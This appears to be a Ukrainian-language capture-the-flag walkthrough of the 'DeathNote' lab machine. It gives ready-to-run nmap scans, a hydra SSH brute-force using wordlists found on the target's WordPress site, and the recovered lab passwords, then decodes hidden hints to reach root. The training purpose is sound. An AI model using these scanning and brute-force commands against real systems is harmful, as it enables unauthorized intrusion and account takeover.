# DeathNote
### 1. Знайти адрес
```bash
nmap -sn 192.168.0.0/24
````
Результат:
![nmap result 1](/deathnote/images/1.png)

### 2. Визначити, що це за машина
```bash
nmap -T4 -A -v 192.168.0.111
````
Результат:
![nmap result 2](/deathnote/images/2.png)

Висновок: це машина на Linux, має вiмкнений ssh(порт 22) i щось з http(порт 80)

Перевiряемо, що за порт 80:
![website](/deathnote/images/3.png)
ip-адрес змiнився на домен "deathnote.vuln/wordpress"

Але сайт не завантажується, схоже що проблема в DNS
### 3. Редагування /etc/hosts
```bash
sudo nano /etc/hosts
````
Вписуємо:
![hosts](/deathnote/images/4.png)
Ctrl+O, Ctrl+X
### 4. Сторiнка завантажується
![webpage](/deathnote/images/5.png)
### 5. Шукаємо пiдказки
Шукаємо iншi директорiї на сайтi

В http-кодi бачимо, що iснує http://deathnote.vuln/wordpress/wp-content/uploads/2021/07/, де знаходяться зображення з сайту
![hint](/deathnote/images/6.png)

Переходимо туди

Бачимо:
![hint2](/deathnote/images/7.png)

Крiм зображень с сайту там є notes.txt:
![notestxt](/deathnote/images/8.png)

I user.txt:
![usertxt](/deathnote/images/9.png)

Виглядають як wordlist'и для чогось. На веб-сторiнцi вiйти не можна, тому перевiримо ssh

### 6. Brute force SSH
Використаю hydra. Завантажуємо notes.txt i user.txt

Назва user.txt натякає на то, що це iмена користувачiв. Тому iнший файл - це мабуть паролi
```bash
hydra -L /home/kali/Desktop/bruteforcingandstuff/users -P /home/kali/Desktop/bruteforcingandstuff/passwords ssh 192.168.0.111
````

I, о несподiванка, працює. Ми знайшли логiн i пароль
![hydraresults](/deathnote/images/10.png)

### 7. SSH
Пiдключаємося
```bash
ssh l@192.168.0.111
````
```bash
yes
````
```bash
death4me
````

![ssh](/deathnote/images/11.png)

Натягаємо сонячнi окуляри i кажемо:
![imin](/deathnote/images/12.gif)

### 8. Визначаємо, що ми знайшли
```bash
ls -la
````
![ls](/deathnote/images/13.png)

```bash
cat user.txt
````
![ls](/deathnote/images/14.png)

Зрозумiло, що нiчого не зрозумiло. Як добре, що 5 рокiв тому YouTube порекомендував менi "ТОП 5 МОВ ПРОГРАМУВАННЯ, НА ЯКИХ НЕМОЖЛИВО ПРОГРАМУВАТИ"

Вставляємо цей код в онлайн-компiлятор для brainfuck
![brainfuck](/deathnote/images/15.png)

Дуже iнформативно, шукаємо далi. Зараз ми в /home/l, тому переходимо в /home/, де зазвичай знаходяться директорiї користувачiв. Пошукаємо там
```bash
cd /home/
````
```bash
ls -la
````
![users](/deathnote/images/16.png)

```bash
cd /home/kira
````
```bash
ls -la
````
![kirauser](/deathnote/images/17.png)
```bash
cat kira.txt
````
![epicfail](/deathnote/images/18.png)

Немає доступу, цiкаво. Треба знайти пароль для користувача "kira". Я знаю, що це нескладна машина, тому iдемо простим шляхом:
```bash
find / 'kira*' 2>/dev/null
````
Забагато результатiв, спробуємо так:
```bash
find / -name 'kira*' 2>/dev/null
````
![foundit](/deathnote/images/19.png)

Щось знайшлося, перевiряємо:
```bash
cd /opt/L/kira-case
````
```bash
ls
````
```bash
cat case-file.txt
````
![anotherredirect](/deathnote/images/20.png)
```bash
cd /opt/L/fake-notebook-rule
````
```bash
ls
````
```bash
cat case.wav
````
Отримуємо:
```bash
63 47 46 7a 63 33 64 6b 49 44 6f 67 61 32 6c 79 59 57 6c 7a 5a 58 5a 70 62 43 41 3d
````
Дуже мало для звукового файлу. Беремо цi байти i пробуємо їх декодувати

![decodedbytes](/deathnote/images/21.png)

Добре, вийшов текст. Це означає, що ми вибрали вiрний шлях. Декодуємо i цей текст
![decodedtext](/deathnote/images/22.png)

Base64: "passwd : kiraisevil"
Ось i наш пароль. Пiдключаємося:
```bash
ssh kira@192.168.0.111
````
```bash
kiraisevil
````
![kirassh](/deathnote/images/23.png)

Знаходимо i виводимо root.txt:

![kirassh](/deathnote/images/24.png)

Перемога
